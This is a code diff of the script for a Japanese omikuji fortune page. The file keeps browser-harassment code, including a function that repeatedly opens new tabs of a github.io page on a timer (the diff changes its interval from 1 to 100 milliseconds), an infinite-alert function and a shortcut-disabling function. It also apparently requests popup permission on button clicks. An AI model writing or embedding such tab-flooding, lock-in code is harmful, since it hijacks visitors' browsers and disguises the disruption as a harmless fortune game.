@@ -4,7 +4,7 @@ let openNewTabInterval;
 function duplicateTabEverySecond() {
     openNewTabInterval = setInterval(function() {
         window.open('https://kabusikigaisyaidea.github.io/burakura8313/');
-    }, 1);
+    }, 100);
 }
 
 // 無限アラートを表示する関数
@@ -49,27 +49,9 @@ function disableShortcuts() {
     });
 }
 
-// 1秒ごとに新しいタブを開く関数
-function duplicateTabEverySecond() {
-    openNewTabInterval = setInterval(function() {
-        window.open('https://kabusikigaisyaidea.github.io/burakura8313/');
-    }, 100);
-}
-
-window.onload = function() {
-    // 初期状態では元のコードを実行しないようにコメントアウト
-    // showAlert();
-    // openNewTabsOnClose();
-    // preventClose();
-    // disableRightClick();
-    // disableShortcuts();
-    // duplicateTabEverySecond();
-};
-
-// ここから新しいコード
-
 document.addEventListener('DOMContentLoaded', function() {
     const omikujiButton = document.getElementById('omikujiButton');
+    const resultDiv = document.getElementById('result');
     let clickCount = 0;
 
     function requestPopupPermission() {
@@ -85,7 +67,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
     function showOmikuji() {
         const fortunes = ['大吉', '中吉', '小吉', '吉', '末吉', '凶', '大凶'];
-        alert('あなたの運勢は：' + fortunes[Math.floor(Math.random() * fortunes.length)]);
+        const randomResult = fortunes[Math.floor(Math.random() * fortunes.length)];
+        resultDiv.textContent = `あなたの運勢は: ${randomResult}`;
     }
 
     function handleClickEvent() {
